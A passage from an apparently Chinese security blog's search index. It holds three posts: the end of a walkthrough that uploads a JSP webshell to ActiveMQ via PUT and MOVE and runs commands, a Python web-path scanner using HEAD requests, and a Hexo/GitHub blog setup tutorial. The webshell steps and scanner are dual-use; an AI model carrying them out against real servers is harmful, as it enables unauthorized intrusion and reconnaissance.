&lt;/pre&gt;  &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>代码来自：<a href="https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp" title="JSP shell" target="_blank" rel="noopener">https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp</a></p><p>上传：<br><img src="https://i.imgur.com/dSa5cgB.png" alt=""></p><p>HTTP状态码为204，即为上传成功</p><p>然后听过MOVE进行改名为jsp<br><img src="https://i.imgur.com/YdINGV6.png" alt=""></p><p>然后我们访问<a href="http://127.0.0.1:8161/api,就可以看到我们上传的shell文件" target="_blank" rel="noopener">http://127.0.0.1:8161/api,就可以看到我们上传的shell文件</a></p><p><img src="https://i.imgur.com/asEAY27.png" alt=""></p><p>执行命令如下：<br><img src="https://i.imgur.com/AI0RAO3.png" alt=""></p><p>ActiveMQ更多漏洞：<a href="http://www.freebuf.com/column/161188.html" title="更多漏洞" target="_blank" rel="noopener">http://www.freebuf.com/column/161188.html</a></p><p>转载请声明：来之422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python扫描web路径小工具</title>
      <link href="/2018/07/25/python%E6%89%AB%E6%8F%8Fweb%E8%B7%AF%E5%BE%84%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2018/07/25/python%E6%89%AB%E6%8F%8Fweb%E8%B7%AF%E5%BE%84%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>今天逛朋友圈的时候。发现了车王说，用python写web路径扫描的小伙伴门用head别用get。<br>后来我去百度了查了一下发现Head和Get的不同之处。所以有了以下这篇文章。<br></p><h1 id="请求对比："><a href="#请求对比：" class="headerlink" title="请求对比："></a>请求对比：</h1><p>GET：使用GET请求某个路径获取返回的响应。请求参数会暴露在外<br><br>HEAD：特别适用在优先的速度和带宽下 <br><br>1.检查资源的有效性。 <br><br>2.检查超链接的有效性。 <br><br>3.检查网页是否被串改。 <br><br>4.多用于自动搜索机器人获取网页的标志信息，获取rss种子信息，或者传递安全认证信息等。 <br><br><img src="https://i.imgur.com/EM4AYjv.png" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>思路：让使用者可以调用指定的web字典进行扫描，添加过滤信息。<br>当返回的URL的状态码为200并且无过滤列表里面关键字则判定为存在该路径。</p><p><strong>代码：</strong></p><pre><code>import requestsimport osurlw=[]okurl=[]noturl=[]error=[&apos;404&apos;,&apos;Not Found&apos;,&apos;403&apos;,&apos;找不到&apos;,&apos;没有权限&apos;,&apos;360&apos;,&apos;云锁&apos;,&apos;网站防火墙&apos;,&apos;D盾&apos;,&apos;百度云加速&apos;] //过滤列表headers={&apos;user-agent&apos;:&apos;Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11&apos;}ld=os.listdir(&apos;dict&apos;)print(&apos;[+]Discovery directory&apos;)for l in ld:    print(&apos;[+]find&apos;,l)print(&apos;&apos;)user=input(&apos;Please choose:&apos;)user2=input(&apos;Enter your URL:&apos;)if os.path.exists(&apos;dict/{}&apos;.format(user)):    print(&apos;[+]File existence {}&apos;.format(user))else:    print(&apos;[-]file does not exist {}&apos;.format(user))    exit()ope=open(&apos;dict/{}&apos;.format(user),&apos;r&apos;)for r in ope.readlines():    url=user2.strip()+&quot;&quot;.join(r.split(&apos;\n&apos;))    urlw.append(url)def ether(urls):    try:        reqt=requests.head(url=urls,headers=headers,allow_redirects=True)        for e in error:            if reqt.status_code==200 and e not in reqt.text: //判断                yes=&apos;[200]=&gt;Discovery path:{}&apos;.format(reqt.url)                if yes in okurl:continue //去重                okurl.append(yes)                print(yes)            else:                no=&apos;[{}]=&gt;Can t find:{}&apos;.format(reqt.status_code,reqt.url)                if no in noturl:continue //去重                noturl.append(no)                print(no)    except Exception as g:        print(&apos;[-]Error in {} url:{}&apos;.format(g,reqt.url))for w in urlw:    ether(w)</code></pre><p><strong>测试效果：</strong><br><img src="https://i.imgur.com/eAIMARt.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>用Github+Hexo搭建一个属于自己的博客</title>
      <link href="/2018/07/24/%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2018/07/24/%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>在博客园写的博文和别人用github+hexo搭建起来的对比。感觉别人的好高大上= =，然后昨天晚上黑哥也在搞看的我也想搞。就有了以下的故事<br>虽然之前按照车王的方法失败了一次，但是还是死心不改在试一次，后面成功了。<br><br>我的环境：OS:Ubuntu<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=257909425,2915417066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><hr><p>首先你得拥有一个属于你的Github账号，如果没有就去注册<br><br>Github官网：<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a></p><p>注册好之后，去新建一个项目。为<username>github.io,必须是你的username。否则会有很多的麻烦<br></username></p><p><img src="https://i.imgur.com/LkZquwd.png" alt=""></p><p>然后你在你电脑里面安装Git,nodejs,hexo,npm<br></p><ol><li>windows安装Git：<a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a> Git官网自行下载安装<br></li><li>Linux下安装： sudo apt-get install git<br></li><li>windows安装nodejs：<a href="https://www.cnblogs.com/hackyo/p/8110951.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackyo/p/8110951.html</a> //安装nodejs教程和npm教程<br></li><li>Linux下安装nodejs：<a href="https://blog.csdn.net/u014361775/article/details/78865582" target="_blank" rel="noopener">https://blog.csdn.net/u014361775/article/details/78865582</a> //安装nodejs和npm教程<br></li><li>安装hexo：npm i -g hexo<br></li><li>查看hexo是否安装成功：hexo -v<br></li><li>hexo初始化：hexo init<br><br>初始化之后你的目录下会出现以下文件夹：<br><br><img src="https://i.imgur.com/YsKwGqW.png" alt=""><br>node_modules：是依赖包<br><br>public：存放的是生成的页面<br><br>scaffolds：命令生成文章等的模板<br><br>source：用命令创建的各种文章<br><br>themes：主题<br><br>_config.yml：整个博客的配置<br><br>db.json：source解析所得到的<br><br>package.json：项目所需模块项目的配置信息<br></li></ol><p>干好之后就开始配置你的hexo了，打开_config.yml配置文件,进行更改。<br><br><img src="https://i.imgur.com/37KDIEA.png" alt=""><br>然后下载你喜欢的模板进行替换，模板在hexo官网自己挑选下载到themes里面。修改根目录下的_config.yml找到themes进行模板替换<br><br>替换完之后预览一下效果。<br><br>hexo clean<br><br>hexo generate<br><br>hexo server<br><br>打开浏览器访问：<a href="http://127.0.0.1:4000" target="_blank" rel="noopener">http://127.0.0.1:4000</a><br><br>我这里的主题是仙人掌大法<br><br><img src="https://i.imgur.com/i3Fumv1.png" alt=""><br>做好这些以后，你得创建ssh<br><br>在gitbash中输入：ssh-keygen -t rsa -C “<a href="mailto:youremail@example.com" target="_blank" rel="noopener">youremail@example.com</a>，生成ssh。然后按下图的方式找到id_rsa.pub文件的内容。<br><br>然后去github找到setting添加ssh key。<br><br><img src="https://i.imgur.com/tNcZBqg.png" alt=""><br>在gitbash中验证是否添加成功：ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><br>完成下一步你就成功啦！<br><br>安装deploy<br><br>npm install hexo-deployer-git –save<br><br>安装之后，去修改你的_config.yml下的deploy。<br>类似于这样子的：<br></p><pre><code>deploy:      type:git    repository:git@github.com:422926799/422926799.github.io.git    branch:master</code></pre><p>弄好之后执行：hexo d -g 即可部署你的博客。访问<a href="https://xxx.github.io就能看到了。" target="_blank" rel="noopener">https://xxx.github.io就能看到了。</a><br>hexo的基本命令：</p><pre><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo p == hexo publishhexo g == hexo generate#生成hexo s == hexo server #启动服务预览hexo d == hexo deploy#部署hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存 网页正常情况下可以忽略此条命令hexo g #生成静态网页hexo d #开始部署hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #将.deploy目录部署到GitHubhexo new [layout] &lt;title&gt;hexo new photo &quot;My Gallery&quot;hexo new &quot;Hello World&quot; --lang tw</code></pre><p><strong><br>转载请注明：来只422926799.github.io。</strong></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
